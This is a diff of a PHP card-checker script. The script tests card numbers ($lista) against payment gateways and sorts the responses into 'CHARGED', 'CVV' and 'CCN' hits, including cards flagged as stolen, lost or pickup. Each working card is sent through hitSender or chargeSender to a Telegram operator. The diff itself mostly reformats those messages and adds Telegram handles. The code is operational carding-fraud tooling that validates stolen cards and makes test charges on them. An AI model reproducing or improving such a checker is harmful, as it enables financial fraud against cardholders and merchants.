@@ -1,5 +1,7 @@
 <?php
 
+// telegram @isnotdev
+
 if (empty($x)) {
  $x = "N/A";
 }
@@ -16,7 +18,7 @@ if (strpos($resp, '"__typename":"Donation"')) {
  echo '<span class="approved">#CHARGED<br></span><span class="abcxyz">status: '.$tsarg.' <br>cc: '.$lista.'<br> result: Your card has been successfully charged. </span><br>';
 
  $artSender =
- "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: Charged $amt ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has been successfully charged 10$.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: Charged $amt ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has been successfully charged 10$.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  chargeSender($chrg, $artSender);
 }
 
@@ -47,7 +49,7 @@ elseif (strpos($resp, "The card has expired. Check the expiration date or use a 
 elseif (strpos($resp, '"status":"succeeded"')) {
  echo '<span class="approved">#CHARGED | '.$gateway.'<br></span><span class="abcxyz">cc: '.$lista.'<br>status: '.$tsarg.' <br> result: Your card has been successfully charged 10$. </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: Charged $amt$ ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has been successfully charged 10$.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: Charged $amt$ ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has been successfully charged 10$.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 }
 
@@ -55,32 +57,32 @@ elseif (strpos($resp, '"status":"succeeded"')) {
 elseif (strpos($resp, '"cvc_check": "pass"')) {
  echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: CVC check passed </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: CVC_Check Passed.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: CVC_Check Passed.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 } elseif
  ((strpos($resp, "Your card zip code is incorrect.")) || (strpos($resp, "incorrect_zip"))) {
  echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: Your card zip code is incorrect </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card zip code is incorrect.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card zip code is incorrect.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 } elseif
  (strpos($resp, "Thank you! For security reasons your order is currently being reviewed.")) {
  echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: CVV - Thank you! For security reasons your order is currently being reviewed. </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: Card Authorized ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Order is currently being reviewed.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: Card Authorized ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Order is currently being reviewed.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 } elseif
  ((strpos($resp, "Your card does not support this type of purchase.")) || (strpos($resp, "transaction_not_allowed"))) {
  echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: Transaction not allowed. </span><br>';
 
  $artSender =
- "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card does not support this type of purchase.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card does not support this type of purchase.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 } elseif
  ((strpos($resp, "Your card has insufficient funds.")) || (strpos($resp, "insufficient_funds"))) {
  echo '<span class="approved">#CVV<br></span><span class="abcxyz">status: '.$cvvmatch.' <br>cc: '.$lista.'<br> result: Your card has insufficient funds. </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has insufficient funds.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CVV Matched ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card has insufficient funds.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 }
 
@@ -88,7 +90,7 @@ elseif (strpos($resp, '"cvc_check": "pass"')) {
 elseif ((strpos($resp, "security code is incorrect.")) || (strpos($resp, "incorrect_cvc")) || (strpos($resp, "Your card's security code is incorrect."))) {
  echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Your card’s security code is incorrect. </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card's security code is incorrect.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Your card's security code is incorrect.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 
 }
@@ -97,31 +99,31 @@ elseif ((strpos($resp, "security code is incorrect.")) || (strpos($resp, "incorr
 elseif (strpos($resp, "stolen_card")) {
  echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Stolen card. </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Stolen Card.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Stolen Card.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 } elseif
  (strpos($resp, "lost_card")) {
  echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Lost Card. </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Lost Card.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Lost Card.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 } elseif
  (strpos($resp, "pickup_card")) {
  echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Pickup card. </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Pickup Card.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Pickup Card.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 } elseif
  (strpos($resp, '"cvc_check": "fail"')) {
  echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: CVC check fail. </span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: CVC Check Failed.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: CVC Check Failed.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 } elseif
  ((strpos($resp, "security code is invalid.")) || (strpos($resp, "invalid_cvc"))) {
  echo '<span class="approved">#CCN<br></span><span class="abcxyz">status: '.$ccnlive.' <br>cc: '.$lista.'<br> result: Your card’s security code is invalid.</span><br>';
 
- $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A[✦] 𝗰𝗰: <code>$lista</code>%0A[✦] 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A[✦] 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Security code is invalid.%0A[✦] 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A[✦] 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
+ $artSender = "[あ] <strong>isnotbot omsim</strong> !%0A━━━━━━━━━━━━━━━━━━━━━━━━━━%0A 𝗰𝗰: <code>$lista</code>%0A 𝘀𝘁𝗮𝘁𝘂𝘀: CCN Approved ✅%0A 𝗺𝗲𝘀𝘀𝗮𝗴𝗲: Security code is invalid.%0A 𝗴𝗮𝘁𝗲𝘄𝗮𝘆: $gateways%0A 𝗼𝘄𝗻𝗲𝗿: $owner%0A";
  hitSender($w2s, $artSender);
 }
 
@@ -186,7 +188,7 @@ elseif
  echo '<span class="declined">#ERROR<br></span><span class="abcxyz">status: '.$ccerror.' <br>cc: '.$lista.'<br> result: Unknown Error. </span><br>';
 }
 
-echo '<span class="abcxyz">bypassing: '.$x.'</span><br>';
+// echo '<span class="abcxyz">bypassing: '.$x.'</span><br>';
 echo '<span class="abcxyz">checker: '.$owner.'</span><br>';
 
 # TELEGRAM: @ARTERXSK
